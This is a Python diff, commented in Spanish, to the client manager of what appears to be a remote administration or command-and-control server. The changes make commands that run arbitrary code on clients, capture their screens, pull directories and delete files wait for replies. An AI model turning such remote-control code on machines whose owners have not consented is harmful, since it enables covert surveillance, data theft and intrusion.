@@ -7,6 +7,7 @@ import io
 from utils.logger import get_console
 from config.settings import RECEIVED_FILES_DIR, DIRECTORIES_DIR, SCREENSHOTS_DIR
 from utils.response_waiter import ResponseWaiter
+from datetime import datetime
 
 class ClientManager:
     """Administra clientes conectados y procesa sus respuestas."""
@@ -17,6 +18,24 @@ class ClientManager:
         self.console = get_console()
         self._cmd = cmd 
         self.response_waiter = ResponseWaiter(timeout=5)
+        
+    def esperar_respuesta_accion(self, accion, cliente_id=None):
+        """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
+        if cliente_id is None:
+            # Esperar respuesta de todos los clientes conectados
+            clientes_ids = [cliente["id"] for cliente in self.servidor.clientes]
+            resultados = []
+            for cid in clientes_ids:
+                recibido = self.response_waiter.esperar_respuesta(cid, accion)
+                resultados.append((cid, recibido))
+            
+            # Verifica si al menos uno respondió
+            if not any(r[1] for r in resultados):
+                return False
+            return True
+        else:
+            # Esperar respuesta solo del cliente especificado
+            return self.response_waiter.esperar_respuesta(cliente_id, accion)
     
     def procesar_respuesta_cliente(self, datos, cliente):
         """Procesa las respuestas recibidas de un cliente."""
@@ -28,6 +47,7 @@ class ClientManager:
             if accion == "respuesta_ejecucion":
                 self.console.print(f"\n{cliente_id} [bold green]Resultado de ejecución:[/bold green]")
                 self.console.print(datos_dict.get("resultado", "Sin resultado"))
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "archivo_recibido":
                 self.console.print(f"\n{cliente_id} [bold green]Archivo guardado:[/bold green] {datos_dict.get('ruta_destino')}")
@@ -39,18 +59,20 @@ class ClientManager:
                 self.console.print(f"\n{cliente_id} [bold red]Error:[/bold red] {datos_dict.get('mensaje')}")
                 
             elif accion == "respuesta_listado":
-                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 self.console.print(f"\n{cliente_id} [bold green]Estructura del directorio '{datos_dict.get('ruta')}':[/bold green]")
                 self.console.print(datos_dict.get("estructura"))
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "directorio_enviado":
                 self._procesar_directorio_enviado(datos_dict, cliente_id)
                 
             elif accion == "eliminacion_exitosa":
                 self._procesar_eliminacion_exitosa(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "captura_enviada":
                 self._procesar_captura_enviada(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "regla_firewall_agregada":
                 self._procesar_regla_firewall_agregada(datos_dict, cliente_id)
@@ -116,7 +138,18 @@ class ClientManager:
     def _procesar_captura_enviada(self, datos_dict, cliente_id):
         """Procesa una captura de pantalla enviada."""
         nombre_archivo = datos_dict.get("nombre_archivo")
-        ruta_destino = datos_dict.get("ruta_destino", os.path.join(SCREENSHOTS_DIR, nombre_archivo))
+        
+        timestamp = datetime.now().strftime("__%d_%m_%Y__%H_%M_%S")
+        
+        ip_cliente = cliente_id.split("(")[-1].replace(")", "").replace("]", "").replace(".", "-")
+
+        nombre_base, extension = os.path.splitext(nombre_archivo)
+        
+        nuevo_nombre = f"{nombre_base}{timestamp}__{ip_cliente}{extension}"
+        
+        ruta_carpeta = datos_dict.get("ruta_destino", SCREENSHOTS_DIR)
+        ruta_destino = os.path.join(ruta_carpeta, nuevo_nombre)
+
         datos_imagen = datos_dict.get("datos_imagen")
         ancho = datos_dict.get("ancho", 0)
         alto = datos_dict.get("alto", 0)
@@ -189,10 +222,7 @@ class ClientManager:
         else:
             self.servidor.enviar_comando_cliente(cliente_id, mensaje)
             
-        cliente_clave = cliente_id or "all"
-        recibido = self.response_waiter.esperar_respuesta(cliente_clave, "respuesta_listado")
-        
-        if not recibido:
+        if not self.esperar_respuesta_accion("respuesta_listado", cliente_id):
             return "[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]"
         return None
     
@@ -203,17 +233,6 @@ class ClientManager:
     def obtener_clientes_conectados(self):
         """Obtiene el número de clientes conectados."""
         return len(self.servidor.clientes)
-    
-    def enviar_comando_ejecutar(self, codigo, cliente_id=None):
-        """Envía comando para ejecutar un código en los clientes."""
-        mensaje = {
-            "accion": "ejecutar",
-            "codigo": codigo
-        }
-        if cliente_id is None:
-            self.servidor.enviar_comando_todos(mensaje)
-        else:
-            self.servidor.enviar_comando_cliente(cliente_id, mensaje)
 
     def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino, cliente_id=None):
         """Envía comando para solicitar un directorio desde los clientes."""
@@ -222,10 +241,20 @@ class ClientManager:
         return handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)
 
     def enviar_comando_capturar_pantalla(self, ruta_destino, nombre_archivo=None, cliente_id=None):
-        """Envía comando para capturar pantalla desde los clientes."""
+        """Envía comando para capturar pantalla y espera respuesta."""
         from server.handlers.screenshot_handler import ScreenshotHandler
         handler = ScreenshotHandler(self)
-        return handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
+        
+        exito_envio = handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
+        if not exito_envio:
+            return False
+
+        accion_esperada = "captura_enviada"
+        if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
+            self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
+            return False
+
+        return True
     
     def enviar_comando_eliminar(self, ruta, cliente_id=None):
         """Envía comando para eliminar un archivo o directorio en los clientes."""
@@ -237,9 +266,23 @@ class ClientManager:
             self.servidor.enviar_comando_todos(mensaje)
         else:
             self.servidor.enviar_comando_cliente(cliente_id, mensaje)
+            
+        if not self.esperar_respuesta_accion("eliminacion_exitosa", cliente_id):
+            return "[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]"
+        return None
         
     def enviar_comando_ejecutar(self, codigo, cliente_id=None):
         """Envía comando para ejecutar un código en los clientes."""
         from server.handlers.command_handler import CommandHandler
         handler = CommandHandler(self)
-        return handler.enviar_comando_ejecutar(codigo, cliente_id)
+        
+        exito_envio = handler.enviar_comando_ejecutar(codigo, cliente_id)
+        if not exito_envio:
+            return False
+        
+        accion_esperada = "respuesta_ejecucion"
+        if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
+            self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
+            return False
+
+        return True
